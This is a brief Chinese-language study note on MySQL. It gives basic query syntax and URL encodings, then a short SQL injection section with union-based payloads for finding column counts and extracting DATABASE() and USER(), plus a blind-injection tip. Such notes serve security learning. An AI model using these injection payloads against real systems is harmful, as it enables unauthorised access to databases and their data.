# MySQL

## 基础语句

show columns from table_name;
show columns from `name`  /\* name中有特殊字符时需要加反引号 \*/
show columns from dbname.anothertable;  /\* 查看其他数据库中的表 \*/

select * from users order by username /\* 按照username排序 \*/
SELECT col_name1, col_name2… FROM table_name LIMIT N, M  /\*从第N(从0开始)条开始返回M条数据\*/

SELECT concat(col_name1, col_name2…) FROM table_name /\*整合列数据\*/
SELECT group_concat(col_name1, col_name2…) FROM table_name /\*整合行、列数据\*/

一些常用的URL编码：
Space: %20
\#: %23
':%27
":%22
+:%2B

\#+$-_.!*() 浏览器地址栏默认不编码，但是不意味着不能编码

## SQL注入

### 联合查询

前后列数必须一样

- 判断列数
  
  ```sql
  SELECT col_name1, …, col_nameN FROM table_name WHERE id = 1 ORDER BY M;
  SELECT col_name1, …, col_nameN FROM table_name WHERE id = 1 union select 1,2, …,M;
  ```

- 数据获取

  ```sql
  SELECT col_name1, …, col_nameN FROM table_name WHERE id = 3 UNION SELECT DATABASE(), USER(), 3
  ```

### 无回显

字符串参与数学运算时， 任意字符串都等于 0